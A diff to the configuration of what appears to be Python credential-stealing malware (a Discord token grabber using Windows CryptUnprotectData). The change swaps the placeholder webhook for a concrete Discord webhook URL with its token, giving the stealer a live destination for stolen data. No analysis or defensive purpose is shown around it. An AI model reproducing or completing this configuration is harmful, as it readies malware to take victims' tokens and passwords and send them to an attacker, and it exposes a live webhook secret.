@@ -23,7 +23,7 @@ from win32crypt import CryptUnprotectData
 config = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
     # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
-    'webhook': "WEBHOOK_HERE",
+    'webhook': "https://discord.com/api/webhooks/985472190008950784/BPSsQWPDcHAdg8P6yEba9wt5ri4YWzUYwYcNHrP_yoCmUIQFEKt4qHIaaBPBGLwqFmSh",
     # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
     'webhook_protector_key': "KEY_HERE",
     # keep it as it is unless you want to have a custom one
